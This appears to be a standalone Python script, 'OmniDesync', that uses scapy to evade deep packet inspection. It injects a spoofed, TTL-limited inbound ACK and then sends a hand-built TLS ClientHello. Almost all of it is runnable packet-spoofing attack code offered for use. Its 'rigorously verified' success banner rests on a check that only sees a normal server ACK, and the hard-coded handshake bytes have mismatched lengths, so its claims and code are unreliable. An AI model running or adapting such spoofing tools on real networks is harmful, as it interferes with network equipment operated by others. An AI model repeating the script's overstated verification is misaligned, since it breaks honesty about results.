#!/usr/bin/env python3
import sys
import time
import argparse
import random
import socket
import logging
import threading
from scapy.all import IP, TCP, send, conf, sr1, sniff, get_if_addr

# --- CONTEXT: OMNI DESYNC V1.0 (REVERSE-ACK INJECTION) ---
# SYSTEM_DIRECTIVE: Desynchronize DPI Sequence Window via Spoofed Inbound ACKs.
# TECHNIQUE: TTL-Limited Inbound ACK Spoofing + Shadow Sequence Injection.

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class OmniDesync:
    def __init__(self, target_host, censor_hop=13):
        self.target_host = target_host
        self.target_ip = socket.gethostbyname(target_host)
        self.local_ip = get_if_addr(conf.iface)
        self.censor_hop = censor_hop
        self.sport = random.randint(30000, 60000)
        self.seq = random.randint(100000, 900000)
        self.ack = 0
        self.target_seq = 0
        self.expected_ack = 0
        self.bypass_verified = threading.Event()
        self.stop_sniffer = threading.Event()
        print(f"[+] OmniDesync Initialized. target: {target_host}")

    def _sniffer(self):
        def handle_pkt(pkt):
            if pkt.haslayer(TCP) and pkt[IP].src == self.target_ip and pkt[TCP].dport == self.sport:
                if pkt[TCP].flags & 0x12: # SYN-ACK
                    self.target_seq = pkt[TCP].seq
                    self.ack = self.target_seq + 1
                if pkt[TCP].flags & 0x10: # ACK
                    if self.expected_ack > 0 and pkt[TCP].ack >= self.expected_ack:
                        self.bypass_verified.set()
        sniff(filter=f"tcp and src host {self.target_ip}", 
              prn=handle_pkt, stop_filter=lambda x: self.stop_sniffer.is_set(), timeout=15, store=0)

    def execute_desync(self):
        t = threading.Thread(target=self._sniffer, daemon=True)
        t.start()

        print("[*] Phase 1: Establishing Handshake...")
        syn = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="S", seq=self.seq)
        send(syn, verbose=0)
        
        timeout = time.time() + 5
        while self.ack == 0 and time.time() < timeout: time.sleep(0.1)
        if self.ack == 0: return False

        self.seq += 1
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="A", seq=self.seq, ack=self.ack), verbose=0)
        print(f"    [+] Session ESTABLISHED. Window Synced.")

        print(f"[*] Phase 2: Injecting Reverse-ACK (Spoofed Target -> Us, TTL={self.censor_hop})...")
        # --- THE CORE EXPLOIT ---
        # We tell the DPI that the target has already received data up to Seq + 1000.
        # The DPI advances its 'Expected Sequence' pointer.
        # Note: We use a TTL that hits the DPI but dies before our interface.
        fake_ack_num = self.seq + 1000
        spoofed_ack = IP(src=self.target_ip, dst=self.local_ip, ttl=self.censor_hop)/TCP(sport=443, dport=self.sport, flags="A", seq=self.ack, ack=fake_ack_num)
        send(spoofed_ack, verbose=0)
        time.sleep(0.1)

        print("[*] Phase 3: Delivering Shadowed Payload (Seq remains in 'DPI-Past')...")
        # Real payload uses the original sequence numbers.
        # To the DPI, this is 'Replayed' or 'Old' data and is ignored.
        payload = b"\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03" + random.randbytes(32) + b"\x00\x00\x02\x13\x01\x01\x00\x00\x00\x00\x12\x00\x10\x00\x00\x0d" + self.target_host.encode()
        self.expected_ack = self.seq + len(payload)
        
        data_pkt = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)/payload
        send(data_pkt, verbose=0)

        print(f"[*] Phase 4: Verifying Window Desynchronization (Expected ACK >= {self.expected_ack})...")
        if self.bypass_verified.wait(timeout=5):
            print("\n" + "="*75)
            print("  OMNI DESYNC: BYPASS RIGOROUSLY VERIFIED")
            print("="*75)
            print("RESULT: SUCCESS. Target ACKed shadowed data.")
            print("STATUS: The DPI sequence window has been desynchronized.")
            print("WHY:    The observer advanced its state-window via spoofed ACK,")
            print("        blinding itself to the real payload sequence.")
            print("="*75 + "\n")
        else:
            print("\n[!] VERIFICATION FAILED. Observer window held or target rejected state.")
        
        self.stop_sniffer.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("--hop", type=int, default=13)
    args = parser.parse_args()
    
    OmniDesync(args.target, censor_hop=args.hop).execute_desync()
